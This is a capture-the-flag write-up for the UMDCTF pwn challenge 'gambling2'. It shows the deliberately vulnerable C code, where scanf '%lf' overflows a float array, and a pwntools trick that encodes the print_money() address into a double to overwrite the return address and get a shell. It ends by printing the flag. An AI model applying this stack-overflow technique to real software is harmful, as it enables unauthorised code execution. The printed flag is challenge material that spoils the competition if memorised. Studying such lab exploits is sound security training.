# gambling2

## 🧩 Challenge Summary

- **Category**: Pwn  
- **Points**: 306  
- **Solves**: 190 teams

---

### 📝 Problem Description

> I gambled all of my life savings in this program (i have no life savings)

---

## 🧠 Challenge Structure

The binary implements a simple gambling game.  
The user is asked to input 7 numbers, and if any of them match a randomly generated float, they "win."  
Although the prize function `print_money()` is commented out, it can still be triggered via memory corruption.

```c
void gamble() {
    float f[4];
    float target = rand_float();
    printf("Enter your lucky numbers: ");
    scanf(" %lf %lf %lf %lf %lf %lf %lf", f,f+1,f+2,f+3,f+4,f+5,f+6);
    if (f[0] == target || f[1] == target || f[2] == target || f[3] == target || f[4] == target || f[5] == target || f[6] == target) { 
        printf("You win!\n");
        // due to economic concerns, we're no longer allowed to give out prizes.
        // print_money();
    } else {
        printf("Aww dang it!\n");
    }
}
```

- The array `f` is declared as `float[4]` (4 bytes per element), but `%lf` is used in `scanf`, which writes 8 bytes per input.
- This mismatch causes a deliberate buffer overflow vulnerability.

---

## ✅ Exploitation Flow

### 🔹 Step 1: Environment Analysis

Binary protections:

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
FORTIFY:  Enabled
Stripped: No
```

Key observations:

- `%lf` reads 8 bytes (`double`), but the array is only meant to hold 4-byte `float`s.
- The 7th input will write past the buffer and eventually reach the return address on the stack.

Sample memory layout using GEF:

```
gef➤  x/24wx $esp
0xffffd5b0:  0x0804a02b  0xffffd5f0  0xffffd5f4  0xffffd5f8
0xffffd5c0:  0xffffd5fc  0xffffd600  0xffffd604  0xffffd608
0xffffd5d0:  0x00000001  0x0804a010  0xffffd61c  0x080492e8
...
0xffffd608:  (7th float input)
0xffffd60c:  (saved return address)
```

- The 7th `double` input lands just before the saved return address.
- Since each `%lf` writes 8 bytes, the upper 4 bytes of the 7th input overwrite the return address.

---

### 🔹 Step 2: Exploitation Strategy

Our goal is to overwrite the return address with the address of the `print_money()` function:

```c
void print_money() {
    system("/bin/sh");
}
```

- In little-endian systems, writing a crafted `double` allows us to control the upper 4 bytes, which align with the return address.
- We use the following trick to encode the function address into a `double`:

```python
payload = struct.unpack('<d', p64(elf.sym.print_money << 32))[0]
```

- This left-shifts the address by 32 bits, placing it into the higher half of the 8-byte double.
- When written via `scanf("%lf")`, it neatly overwrites the return address on the stack.

### ✅ Summary Table

| Step | Action                                                                 |
|------|------------------------------------------------------------------------|
| 1    | Input six junk `double` values to fill the buffer and align stack     |
| 2    | Use a crafted `double` to overwrite the return address                |
| 3    | Execution jumps to `print_money()`, which executes `/bin/sh`         |

---

## 🏁 Flag

Once a shell is gained:

```bash
$ cat flag.txt
```

```
UMDCTF{99_percent_of_pwners_quit_before_they_get_a_shell_congrats_on_being_the_1_percent}
```
